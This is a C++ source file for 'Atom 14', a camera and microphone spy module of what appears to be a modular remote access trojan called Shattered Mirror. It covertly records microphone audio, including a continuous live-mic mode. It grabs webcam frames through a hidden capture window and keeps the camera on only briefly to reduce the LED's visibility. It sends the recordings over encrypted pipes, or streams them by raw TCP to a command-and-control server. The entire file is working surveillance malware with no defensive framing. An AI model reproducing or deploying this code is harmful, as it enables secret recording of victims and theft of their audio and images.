/*=============================================================================
 * Shattered Mirror v1 — Atom 14: Camera & Microphone Spy
 * Combined capture atom. Uses waveIn API for microphone recording
 * and AVICAP32 (capCreateCaptureWindow) for webcam snapshots.
 * Commands: "MIC" = audio only, "CAM" = camera only, "BOTH" = both
 * Audio is recorded as raw PCM -> WAV header appended before send.
 * Camera captures single frames to minimize LED exposure time.
 *===========================================================================*/

#include "Atom_14_Spy.h"
#include "../Orchestrator/AtomManager.h"
#include "../Orchestrator/Config.h"
#include <cstdio>
#include <cstring>
#include <string>
#include <vector>
#include <mmsystem.h>
#include <vfw.h>
#include <gdiplus.h>
#include <unknwn.h>

#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "vfw32.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "ole32.lib")

using namespace Gdiplus;

static void SpyDebug(const char *format, ...) {
    if (!Config::LOGGING_ENABLED) return;
    char buf[512];
    va_list args;
    va_start(args, format);
    vsnprintf(buf, sizeof(buf), format, args);
    va_end(args);
    FILE *f = fopen("log\\spy_debug.txt", "a");
    if (f) { fprintf(f, "%s\n", buf); fclose(f); }
}

static int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0, size = 0;
    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if (!pImageCodecInfo) return -1;
    GetImageEncoders(num, size, pImageCodecInfo);
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    free(pImageCodecInfo);
    return -1;
}

/* =========================================================================
 *  MICROPHONE CAPTURE (waveIn API — no third-party DLLs)
 * ========================================================================= */
#define MIC_SAMPLE_RATE   16000
#define MIC_BITS          16
#define MIC_CHANNELS      1
#define MIC_BUFFER_SIZE   (MIC_SAMPLE_RATE * (MIC_BITS / 8) * MIC_CHANNELS) // 1 second
#define MIC_DURATION_SEC  30   // Record 30 seconds per capture

static std::vector<BYTE> s_AudioData;
static CRITICAL_SECTION s_AudioLock;
static volatile BOOL s_bRecording = FALSE;

static void CALLBACK WaveInProc(HWAVEIN hwi, UINT uMsg, DWORD_PTR dwInstance,
                                 DWORD_PTR dwParam1, DWORD_PTR dwParam2) {
    if (uMsg == WIM_DATA) {
        WAVEHDR *pHdr = (WAVEHDR*)dwParam1;
        if (pHdr->dwBytesRecorded > 0 && s_bRecording) {
            EnterCriticalSection(&s_AudioLock);
            s_AudioData.insert(s_AudioData.end(),
                               pHdr->lpData, pHdr->lpData + pHdr->dwBytesRecorded);
            LeaveCriticalSection(&s_AudioLock);
        }
        // Re-queue the buffer if still recording
        if (s_bRecording) {
            waveInAddBuffer(hwi, pHdr, sizeof(WAVEHDR));
        }
    }
}

static BOOL RecordMicrophone(DWORD dwDurationSec, std::vector<BYTE> &outWav, HANDLE hCmdPipe = NULL, BYTE *SharedSessionKey = NULL) {
    InitializeCriticalSection(&s_AudioLock);
    s_AudioData.clear();
    s_bRecording = TRUE;

    WAVEFORMATEX wfx = {0};
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = MIC_CHANNELS;
    wfx.nSamplesPerSec = MIC_SAMPLE_RATE;
    wfx.wBitsPerSample = MIC_BITS;
    wfx.nBlockAlign = wfx.nChannels * (wfx.wBitsPerSample / 8);
    wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;

    HWAVEIN hWaveIn = NULL;
    MMRESULT res = waveInOpen(&hWaveIn, WAVE_MAPPER, &wfx, (DWORD_PTR)WaveInProc, 0, CALLBACK_FUNCTION);
    if (res != MMSYSERR_NOERROR) {
        SpyDebug("[Mic] waveInOpen failed: %d", res);
        s_bRecording = FALSE;
        DeleteCriticalSection(&s_AudioLock);
        return FALSE;
    }

    // Prepare double buffers
    const int NUM_BUFFERS = 4;
    WAVEHDR headers[NUM_BUFFERS] = {0};
    char *buffers[NUM_BUFFERS];
    for (int i = 0; i < NUM_BUFFERS; i++) {
        buffers[i] = (char*)malloc(MIC_BUFFER_SIZE);
        headers[i].lpData = buffers[i];
        headers[i].dwBufferLength = MIC_BUFFER_SIZE;
        waveInPrepareHeader(hWaveIn, &headers[i], sizeof(WAVEHDR));
        waveInAddBuffer(hWaveIn, &headers[i], sizeof(WAVEHDR));
    }

    waveInStart(hWaveIn);
    SpyDebug("[Mic] Recording for %lu seconds...", dwDurationSec);

    // Record for the specified duration (interruptible)
    DWORD dwStart = GetTickCount();
    DWORD dwTarget = dwDurationSec * 1000;
    while (GetTickCount() - dwStart < dwTarget && s_bRecording) {
        Sleep(200);
        
        // Check for stop command during recording
        if (hCmdPipe && SharedSessionKey) {
            DWORD dwAvail = 0;
            if (PeekNamedPipe(hCmdPipe, NULL, 0, NULL, &dwAvail, NULL) && dwAvail > 0) {
                IPC_MESSAGE stopMsg = {0};
                if (IPC_ReceiveMessage(hCmdPipe, &stopMsg, SharedSessionKey, 16)) {
                    std::string stopCmd((char*)stopMsg.Payload, stopMsg.dwPayloadLen);
                    if (stopCmd == "BALE_STOP" || stopCmd == "TERMINATE" || stopMsg.CommandId == CMD_TERMINATE) {
                        SpyDebug("[Mic] Recording ABORTED by command.");
                        s_bRecording = FALSE;
                        break;
                    }
                }
            }
        }
    }

    s_bRecording = FALSE;
    waveInStop(hWaveIn);
    waveInReset(hWaveIn);

    for (int i = 0; i < NUM_BUFFERS; i++) {
        waveInUnprepareHeader(hWaveIn, &headers[i], sizeof(WAVEHDR));
        free(buffers[i]);
    }
    waveInClose(hWaveIn);

    // Build WAV file in memory
    DWORD dataSize = (DWORD)s_AudioData.size();
    DWORD fileSize = 44 + dataSize; // WAV header + PCM data

    outWav.resize(fileSize);
    BYTE *p = outWav.data();

    // RIFF header
    memcpy(p, "RIFF", 4); p += 4;
    *(DWORD*)p = fileSize - 8; p += 4;
    memcpy(p, "WAVE", 4); p += 4;

    // fmt chunk
    memcpy(p, "fmt ", 4); p += 4;
    *(DWORD*)p = 16; p += 4;                    // Chunk size
    *(WORD*)p = WAVE_FORMAT_PCM; p += 2;         // Format
    *(WORD*)p = MIC_CHANNELS; p += 2;            // Channels
    *(DWORD*)p = MIC_SAMPLE_RATE; p += 4;        // Sample rate
    *(DWORD*)p = wfx.nAvgBytesPerSec; p += 4;   // Byte rate
    *(WORD*)p = wfx.nBlockAlign; p += 2;         // Block align
    *(WORD*)p = MIC_BITS; p += 2;                // Bits per sample

    // data chunk
    memcpy(p, "data", 4); p += 4;
    *(DWORD*)p = dataSize; p += 4;
    memcpy(p, s_AudioData.data(), dataSize);

    s_AudioData.clear(); // Clear temp accumulation buffer (NOT outWav!)
    DeleteCriticalSection(&s_AudioLock);

    SpyDebug("[Mic] WAV built: %lu bytes (%lu seconds)", fileSize, dwDurationSec);
    return TRUE;
}

/* =========================================================================
 *  WEBCAM CAPTURE (AVICAP32 — built into Windows, no extra DLLs)
 * ========================================================================= */
static BOOL CaptureWebcamFrame(std::vector<BYTE> &outBmp) {
    // Create a hidden capture window
    HWND hCapWnd = capCreateCaptureWindowA("SpyCam", WS_POPUP, 0, 0, 640, 480, NULL, 0);
    if (!hCapWnd) {
        SpyDebug("[Cam] capCreateCaptureWindow failed.");
        return FALSE;
    }

    // Try to connect to any available video device (0-9)
    BOOL bConnected = FALSE;
    int driverIndex = 0;
    for (driverIndex = 0; driverIndex < 10; driverIndex++) {
        char szName[128], szVer[128];
        if (capGetDriverDescriptionA(driverIndex, szName, sizeof(szName), szVer, sizeof(szVer))) {
            SpyDebug("[Cam] Found driver %d: %s (%s)", driverIndex, szName, szVer);
            if (capDriverConnect(hCapWnd, driverIndex)) {
                SpyDebug("[Cam] Successfully connected to driver %d", driverIndex);
                bConnected = TRUE;
                break;
            }
        }
    }

    if (!bConnected) {
        SpyDebug("[Cam] No webcam driver found or connection failed.");
        DestroyWindow(hCapWnd);
        return FALSE;
    }

    // Grab a single frame
    capPreview(hCapWnd, FALSE);
    capOverlay(hCapWnd, FALSE);

    // Give the sensor time to warm up and adjust exposure (3 seconds, interruptible)
    DWORD dwWarmupStart = GetTickCount();
    while (GetTickCount() - dwWarmupStart < 3000) {
        Sleep(200);
        // We don't check pipe here because we haven't finished the capture yet,
        // but at least it returns to the main loop faster if we were to add a stop check.
        // Actually, let's just make it a smaller sleep for now.
    }
    
    if (!capGrabFrame(hCapWnd)) {
        SpyDebug("[Cam] capGrabFrame failed.");
        capDriverDisconnect(hCapWnd);
        DestroyWindow(hCapWnd);
        return FALSE;
    }

    // Save frame to a temp BMP file (avicap32 limitation)
    char szTempPath[MAX_PATH];
    char szTempBmp[MAX_PATH];
    GetTempPathA(MAX_PATH, szTempPath);
    sprintf_s(szTempBmp, "%s%lu_cam.tmp", szTempPath, GetTickCount());
    
    if (!capFileSaveDIB(hCapWnd, szTempBmp)) {
        SpyDebug("[Cam] capFileSaveDIB failed to save %s", szTempBmp);
        capDriverDisconnect(hCapWnd);
        DestroyWindow(hCapWnd);
        return FALSE;
    }

    // Disconnect camera ASAP to minimize LED time
    capDriverDisconnect(hCapWnd);
    DestroyWindow(hCapWnd);

    // Read the BMP and convert to PNG via GDI+
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    {
        // Convert szTempBmp to WCHAR
        WCHAR wszTempBmp[MAX_PATH];
        MultiByteToWideChar(CP_ACP, 0, szTempBmp, -1, wszTempBmp, MAX_PATH);

        Bitmap* bmp = new Bitmap(wszTempBmp);
        if (bmp && bmp->GetLastStatus() == Ok) {
            IStream* pStream = NULL;
            if (CreateStreamOnHGlobal(NULL, TRUE, &pStream) == S_OK) {
                CLSID pngClsid;
                if (GetEncoderClsid(L"image/png", &pngClsid) != -1) {
                    if (bmp->Save(pStream, &pngClsid, NULL) == Ok) {
                        // Read from stream to vector
                        STATSTG statstg;
                        pStream->Stat(&statstg, STATFLAG_NONAME);
                        outBmp.resize((size_t)statstg.cbSize.QuadPart);
                        LARGE_INTEGER liZero = { 0 };
                        pStream->Seek(liZero, STREAM_SEEK_SET, NULL);
                        ULONG bytesRead = 0;
                        pStream->Read(outBmp.data(), (ULONG)outBmp.size(), &bytesRead);
                        SpyDebug("[Cam] Converted to PNG: %zu bytes", outBmp.size());
                    } else {
                        SpyDebug("[Cam] GDI+ Save to stream failed.");
                    }
                }
                pStream->Release();
            }
            delete bmp;
        } else {
            SpyDebug("[Cam] GDI+ Failed to load captured BMP.");
        }
    }
    GdiplusShutdown(gdiplusToken);

    DeleteFileA(szTempBmp); // Cleanup
    return (outBmp.size() > 0);
}

/* === MAIN ENTRY POINT === */
DWORD WINAPI SpyCamAtomMain(LPVOID lpParam) {
    DWORD dwAtomId = (DWORD)(ULONG_PTR)lpParam;
    SpyDebug("[Atom 14] Spy Camera/Mic started. ID: %lu", dwAtomId);

    HANDLE hCmdPipe = IPC_ConnectToCommandPipe(dwAtomId);
    if (!hCmdPipe) { SpyDebug("[Atom 14] FATAL: Command pipe failed."); return 1; }

    HANDLE hReportPipe = IPC_ConnectToReportPipe(dwAtomId);
    if (!hReportPipe) { 
        SpyDebug("[Atom 14] FATAL: Report pipe failed. Error: %lu", GetLastError());
        CloseHandle(hCmdPipe); 
        return 1; 
    }
    SpyDebug("[Atom 14] IPC pipes connected successfully.");

    BYTE SharedSessionKey[16];
    memcpy(SharedSessionKey, Config::PSK_ID, 16);

    // Send CMD_READY
    IPC_MESSAGE readyMsg = {0};
    readyMsg.dwSignature = 0x534D4952;
    readyMsg.CommandId = CMD_READY;
    readyMsg.AtomId = dwAtomId;
    IPC_SendMessage(hReportPipe, &readyMsg, SharedSessionKey, 16);

    while (TRUE) {
        DWORD dwAvail = 0;
        if (PeekNamedPipe(hCmdPipe, NULL, 0, NULL, &dwAvail, NULL) && dwAvail > 0) {
            IPC_MESSAGE inMsg = {0};
            if (IPC_ReceiveMessage(hCmdPipe, &inMsg, SharedSessionKey, 16)) {
                if (inMsg.CommandId == CMD_EXECUTE) {
                    std::string cmd((char*)inMsg.Payload, inMsg.dwPayloadLen);
                    SpyDebug("[Atom 14] Command: %s", cmd.c_str());
                    BOOL bDoMic = (cmd == "MIC" || cmd.find("MIC ") == 0 || cmd == "BOTH" || cmd.find("BOTH ") == 0 || cmd.find("BALE_MIC") == 0 || cmd.find("BALE_BOTH") == 0 || cmd == "BALE_LIVE_MIC");
                    BOOL bDoCam = (cmd == "CAM" || cmd.find("CAM ") == 0 || cmd == "BOTH" || cmd.find("BOTH ") == 0 || cmd.find("BALE_CAM") == 0 || cmd.find("BALE_BOTH") == 0);
                    BOOL bIsBale = (cmd.find("BALE_") == 0);
                    BOOL bLiveMic = (cmd == "BALE_LIVE_MIC");

                    // === LIVE MIC (continuous recording until BALE_STOP) ===
                    if (bLiveMic) {
                        SpyDebug("[Atom 14] BALE_LIVE_MIC: Starting continuous mic recording...");
                        int clipCount = 0;
                        BOOL bStopLive = FALSE;
                        while (!bStopLive) {
                            clipCount++;
                            SpyDebug("[Atom 14] Recording clip %d (30s)...", clipCount);
                            std::vector<BYTE> wavData;
                            if (RecordMicrophone(30, wavData, hCmdPipe, SharedSessionKey)) {
                                // Send via chunked protocol
                                {
                                    struct { DWORD dwType; DWORD dwFlags; DWORD dwPayloadLen; } hdr;
                                    hdr.dwType = 2; hdr.dwFlags = 0x10; hdr.dwPayloadLen = 0;
                                    char meta[128];
                                    sprintf_s(meta, "name=live_mic_%d_%lu.wav size=%zu", clipCount, GetTickCount(), wavData.size());
                                    IPC_MESSAGE startMsg = {0};
                                    startMsg.dwSignature = 0x534D4952;
                                    startMsg.CommandId = CMD_BALE_REPORT;
                                    startMsg.AtomId = dwAtomId;
                                    startMsg.dwPayloadLen = sizeof(hdr) + (DWORD)strlen(meta);
                                    memcpy(startMsg.Payload, &hdr, sizeof(hdr));
                                    memcpy(startMsg.Payload + sizeof(hdr), meta, strlen(meta));
                                    IPC_SendMessage(hReportPipe, &startMsg, SharedSessionKey, 16);
                                }
                                DWORD offset = 0;
                                DWORD chunkMax = MAX_IPC_PAYLOAD_SIZE - sizeof(DWORD)*3 - 64;
                                while (offset < (DWORD)wavData.size()) {
                                    DWORD chunkSize = min((DWORD)wavData.size() - offset, chunkMax);
                                    struct { DWORD dwType; DWORD dwFlags; DWORD dwPayloadLen; } hdr;
                                    hdr.dwType = 2; hdr.dwFlags = 0x11; hdr.dwPayloadLen = chunkSize;
                                    IPC_MESSAGE chunkMsg = {0};
                                    chunkMsg.dwSignature = 0x534D4952;
                                    chunkMsg.CommandId = CMD_BALE_REPORT;
                                    chunkMsg.AtomId = dwAtomId;
                                    chunkMsg.dwPayloadLen = sizeof(hdr) + chunkSize;
                                    memcpy(chunkMsg.Payload, &hdr, sizeof(hdr));
                                    memcpy(chunkMsg.Payload + sizeof(hdr), wavData.data() + offset, chunkSize);
                                    IPC_SendMessage(hReportPipe, &chunkMsg, SharedSessionKey, 16);
                                    offset += chunkSize;
                                }
                                {
                                    struct { DWORD dwType; DWORD dwFlags; DWORD dwPayloadLen; } hdr;
                                    hdr.dwType = 2; hdr.dwFlags = 0x12; hdr.dwPayloadLen = 0;
                                    IPC_MESSAGE endMsg = {0};
                                    endMsg.dwSignature = 0x534D4952;
                                    endMsg.CommandId = CMD_BALE_REPORT;
                                    endMsg.AtomId = dwAtomId;
                                    endMsg.dwPayloadLen = sizeof(hdr);
                                    memcpy(endMsg.Payload, &hdr, sizeof(hdr));
                                    IPC_SendMessage(hReportPipe, &endMsg, SharedSessionKey, 16);
                                }
                                SpyDebug("[Atom 14] Live mic clip %d sent.", clipCount);
                            }

                            // Check for BALE_STOP between clips
                            DWORD dwStopAvail = 0;
                            if (PeekNamedPipe(hCmdPipe, NULL, 0, NULL, &dwStopAvail, NULL) && dwStopAvail > 0) {
                                IPC_MESSAGE stopMsg = {0};
                                if (IPC_ReceiveMessage(hCmdPipe, &stopMsg, SharedSessionKey, 16)) {
                                    std::string stopCmd((char*)stopMsg.Payload, stopMsg.dwPayloadLen);
                                    if (stopCmd == "BALE_STOP" || stopCmd == "TERMINATE" || stopCmd.find("/stop_live") != std::string::npos ||
                                        stopMsg.CommandId == CMD_TERMINATE || stopMsg.CommandId == CMD_STOP_ALL) {
                                        SpyDebug("[Atom 14] BALE_LIVE_MIC stopped by command.");
                                        bStopLive = TRUE;
                                    }
                                }
                            }
                        }
                        SpyDebug("[Atom 14] BALE_LIVE_MIC ended. Sent %d clips.", clipCount);
                    }
                    // === MICROPHONE (single-shot) ===
                    else if (bDoMic) {
                        DWORD dwMicDuration = 30;
                        if (cmd.find("BALE_MIC_") == 0) {
                            dwMicDuration = (DWORD)atoi(cmd.substr(9).c_str());
                        } else if (cmd.find("BALE_BOTH_") == 0) {
                            dwMicDuration = (DWORD)atoi(cmd.substr(10).c_str());
                        } else if (cmd.find("MIC ") == 0) {
                            dwMicDuration = (DWORD)atoi(cmd.substr(4).c_str());
                        } else if (cmd.find("BOTH ") == 0) {
                            dwMicDuration = (DWORD)atoi(cmd.substr(5).c_str());
                        }
                        if (dwMicDuration == 0) dwMicDuration = 30;

                        SpyDebug("[Atom 14] Recording microphone (%lu s)...", dwMicDuration);
                        std::vector<BYTE> wavData;
                        if (RecordMicrophone(dwMicDuration, wavData, hCmdPipe, SharedSessionKey)) {
                            if (bIsBale) {
                                SpyDebug("[Atom 14] Sending mic WAV via chunked BALE_REPORT (%zu bytes)", wavData.size());

                                // --- CHUNK START ---
                                {
                                  struct { DWORD dwType; DWORD dwFlags; DWORD dwPayloadLen; } hdr;
                                  hdr.dwType = 2; // Audio
                                  hdr.dwFlags = 0x10; // BALE_FLAG_CHUNK_START
                                  hdr.dwPayloadLen = 0;
                                  char meta[128];
                                  sprintf_s(meta, "name=mic_%lu.wav size=%zu", GetTickCount(), wavData.size());
                                  IPC_MESSAGE startMsg = {0};
                                  startMsg.dwSignature = 0x534D4952;
                                  startMsg.CommandId = CMD_BALE_REPORT;
                                  startMsg.AtomId = dwAtomId;
                                  startMsg.dwPayloadLen = sizeof(hdr) + (DWORD)strlen(meta);
                                  memcpy(startMsg.Payload, &hdr, sizeof(hdr));
                                  memcpy(startMsg.Payload + sizeof(hdr), meta, strlen(meta));
                                  IPC_SendMessage(hReportPipe, &startMsg, SharedSessionKey, 16);
                                }

                                // --- CHUNK DATA ---
                                DWORD offset = 0;
                                DWORD chunkMax = MAX_IPC_PAYLOAD_SIZE - sizeof(DWORD)*3 - 64;
                                while (offset < (DWORD)wavData.size()) {
                                  DWORD chunkSize = min((DWORD)wavData.size() - offset, chunkMax);
                                  struct { DWORD dwType; DWORD dwFlags; DWORD dwPayloadLen; } hdr;
                                  hdr.dwType = 2; hdr.dwFlags = 0x11; hdr.dwPayloadLen = chunkSize;
                                  IPC_MESSAGE chunkMsg = {0};
                                  chunkMsg.dwSignature = 0x534D4952;
                                  chunkMsg.CommandId = CMD_BALE_REPORT;
                                  chunkMsg.AtomId = dwAtomId;
                                  chunkMsg.dwPayloadLen = sizeof(hdr) + chunkSize;
                                  memcpy(chunkMsg.Payload, &hdr, sizeof(hdr));
                                  memcpy(chunkMsg.Payload + sizeof(hdr), wavData.data() + offset, chunkSize);
                                  IPC_SendMessage(hReportPipe, &chunkMsg, SharedSessionKey, 16);
                                  offset += chunkSize;
                                }

                                // --- CHUNK END ---
                                {
                                  struct { DWORD dwType; DWORD dwFlags; DWORD dwPayloadLen; } hdr;
                                  hdr.dwType = 2; hdr.dwFlags = 0x12; hdr.dwPayloadLen = 0;
                                  IPC_MESSAGE endMsg = {0};
                                  endMsg.dwSignature = 0x534D4952;
                                  endMsg.CommandId = CMD_BALE_REPORT;
                                  endMsg.AtomId = dwAtomId;
                                  endMsg.dwPayloadLen = sizeof(hdr);
                                  memcpy(endMsg.Payload, &hdr, sizeof(hdr));
                                  IPC_SendMessage(hReportPipe, &endMsg, SharedSessionKey, 16);
                                }
                                SpyDebug("[Atom 14] Mic WAV chunked transfer complete.");
                            } else {
                                // === TURBO TCP STREAMING ===
                                char mic_domain[256] = {0};
                                int mic_port = 0;
                                Config::GetActiveC2Target(mic_domain, sizeof(mic_domain), &mic_port);

                                SOCKET sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
                                if (sock != INVALID_SOCKET) {
                                    struct hostent *host = gethostbyname(mic_domain);
                                    if (host) {
                                        SOCKADDR_IN sin;
                                        memset(&sin, 0, sizeof(sin));
                                        sin.sin_family = AF_INET;
                                        sin.sin_port = htons(mic_port); 
                                        sin.sin_addr.s_addr = *((unsigned long*)host->h_addr);
                                        
                                        SpyDebug("[Atom 14] Turbo TCP: Connecting to %s:%d for Mic...", mic_domain, mic_port);
                                        if (connect(sock, (SOCKADDR*)&sin, sizeof(sin)) != SOCKET_ERROR) {
                                            char header[128];
                                            sprintf_s(header, "[SPY_MIC] size=%zu", wavData.size());
                                            send(sock, header, (int)strlen(header) + 1, 0);
                                            send(sock, (const char*)wavData.data(), (int)wavData.size(), 0);
                                            SpyDebug("[Atom 14] Mic data sent via Turbo TCP.");
                                        } else {
                                            SpyDebug("[Atom 14] Turbo TCP connect FAILED. Error: %d", WSAGetLastError());
                                        }
                                    } else {
                                        SpyDebug("[Atom 14] gethostbyname FAILED for %s", mic_domain);
                                    }
                                    closesocket(sock);
                                } else {
                                    SpyDebug("[Atom 14] WSASocketA FAILED. Error: %d", WSAGetLastError());
                                }
                            }
                        } else {
                            SpyDebug("[Atom 14] RecordMicrophone FAILED.");
                            char err[] = "[SPY_MIC] Recording failed (no microphone?).";
                            IPC_MESSAGE errMsg = {0};
                            errMsg.dwSignature = 0x534D4952;
                            errMsg.CommandId = CMD_REPORT;
                            errMsg.AtomId = dwAtomId;
                            errMsg.dwPayloadLen = (DWORD)strlen(err);
                            memcpy(errMsg.Payload, err, errMsg.dwPayloadLen);
                            IPC_SendMessage(hReportPipe, &errMsg, SharedSessionKey, 16);
                        }
                    }

                    // === CAMERA ===
                    if (bDoCam) {
                        SpyDebug("[Atom 14] Capturing webcam frame...");
                        std::vector<BYTE> camData;
                        if (CaptureWebcamFrame(camData)) {
                            if (bIsBale) {
                                SpyDebug("[Atom 14] Sending cam PNG via chunked BALE_REPORT (%zu bytes)", camData.size());

                                // --- CHUNK START ---
                                {
                                  struct { DWORD dwType; DWORD dwFlags; DWORD dwPayloadLen; } hdr;
                                  hdr.dwType = 4; // Cam
                                  hdr.dwFlags = 0x10; // BALE_FLAG_CHUNK_START
                                  hdr.dwPayloadLen = 0;
                                  char meta[128];
                                  sprintf_s(meta, "name=webcam_%lu.png size=%zu", GetTickCount(), camData.size());
                                  IPC_MESSAGE startMsg = {0};
                                  startMsg.dwSignature = 0x534D4952;
                                  startMsg.CommandId = CMD_BALE_REPORT;
                                  startMsg.AtomId = dwAtomId;
                                  startMsg.dwPayloadLen = sizeof(hdr) + (DWORD)strlen(meta);
                                  memcpy(startMsg.Payload, &hdr, sizeof(hdr));
                                  memcpy(startMsg.Payload + sizeof(hdr), meta, strlen(meta));
                                  IPC_SendMessage(hReportPipe, &startMsg, SharedSessionKey, 16);
                                }

                                // --- CHUNK DATA ---
                                DWORD offset = 0;
                                DWORD chunkMax = MAX_IPC_PAYLOAD_SIZE - sizeof(DWORD)*3 - 64;
                                while (offset < (DWORD)camData.size()) {
                                  DWORD chunkSize = min((DWORD)camData.size() - offset, chunkMax);
                                  struct { DWORD dwType; DWORD dwFlags; DWORD dwPayloadLen; } hdr;
                                  hdr.dwType = 4; hdr.dwFlags = 0x11; hdr.dwPayloadLen = chunkSize;
                                  IPC_MESSAGE chunkMsg = {0};
                                  chunkMsg.dwSignature = 0x534D4952;
                                  chunkMsg.CommandId = CMD_BALE_REPORT;
                                  chunkMsg.AtomId = dwAtomId;
                                  chunkMsg.dwPayloadLen = sizeof(hdr) + chunkSize;
                                  memcpy(chunkMsg.Payload, &hdr, sizeof(hdr));
                                  memcpy(chunkMsg.Payload + sizeof(hdr), camData.data() + offset, chunkSize);
                                  IPC_SendMessage(hReportPipe, &chunkMsg, SharedSessionKey, 16);
                                  offset += chunkSize;
                                }

                                // --- CHUNK END ---
                                {
                                  struct { DWORD dwType; DWORD dwFlags; DWORD dwPayloadLen; } hdr;
                                  hdr.dwType = 4; hdr.dwFlags = 0x12; hdr.dwPayloadLen = 0;
                                  IPC_MESSAGE endMsg = {0};
                                  endMsg.dwSignature = 0x534D4952;
                                  endMsg.CommandId = CMD_BALE_REPORT;
                                  endMsg.AtomId = dwAtomId;
                                  endMsg.dwPayloadLen = sizeof(hdr);
                                  memcpy(endMsg.Payload, &hdr, sizeof(hdr));
                                  IPC_SendMessage(hReportPipe, &endMsg, SharedSessionKey, 16);
                                }
                                SpyDebug("[Atom 14] Cam PNG chunked transfer complete.");
                            } else {
                                // === TURBO TCP STREAMING ===
                                char cam_domain[256] = {0};
                                int cam_port = 0;
                                Config::GetActiveC2Target(cam_domain, sizeof(cam_domain), &cam_port);

                                SOCKET sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
                                if (sock != INVALID_SOCKET) {
                                    struct hostent *host = gethostbyname(cam_domain);
                                    if (host) {
                                        SOCKADDR_IN sin;
                                        memset(&sin, 0, sizeof(sin));
                                        sin.sin_family = AF_INET;
                                        sin.sin_port = htons(cam_port); 
                                        sin.sin_addr.s_addr = *((unsigned long*)host->h_addr);
                                        
                                        SpyDebug("[Atom 14] Turbo TCP: Connecting to %s:%d for Cam...", cam_domain, cam_port);
                                        if (connect(sock, (SOCKADDR*)&sin, sizeof(sin)) != SOCKET_ERROR) {
                                            char header[128];
                                            sprintf_s(header, "[SPY_CAM] size=%zu", camData.size());
                                            send(sock, header, (int)strlen(header) + 1, 0);
                                            send(sock, (const char*)camData.data(), (int)camData.size(), 0);
                                            SpyDebug("[Atom 14] Cam data sent via Turbo TCP.");
                                        } else {
                                            SpyDebug("[Atom 14] Turbo TCP connect FAILED. Error: %d", WSAGetLastError());
                                        }
                                    } else {
                                        SpyDebug("[Atom 14] gethostbyname FAILED for %s", cam_domain);
                                    }
                                    closesocket(sock);
                                } else {
                                    SpyDebug("[Atom 14] WSASocketA FAILED. Error: %d", WSAGetLastError());
                                }
                            }
                        } else {
                            SpyDebug("[Atom 14] CaptureWebcamFrame FAILED.");
                            char err[] = "[SPY_CAM] Capture failed (no webcam?).";
                            IPC_MESSAGE errMsg = {0};
                            errMsg.dwSignature = 0x534D4952;
                            errMsg.CommandId = CMD_REPORT;
                            errMsg.AtomId = dwAtomId;
                            errMsg.dwPayloadLen = (DWORD)strlen(err);
                            memcpy(errMsg.Payload, err, errMsg.dwPayloadLen);
                            IPC_SendMessage(hReportPipe, &errMsg, SharedSessionKey, 16);
                        }
                    }

                } else if (inMsg.CommandId == CMD_TERMINATE) {
                    SpyDebug("[Atom 14] CMD_TERMINATE received.");
                    break;
                }
            }
        }
        Sleep(100);
    }

    CloseHandle(hCmdPipe);
    CloseHandle(hReportPipe);
    return 0;
}
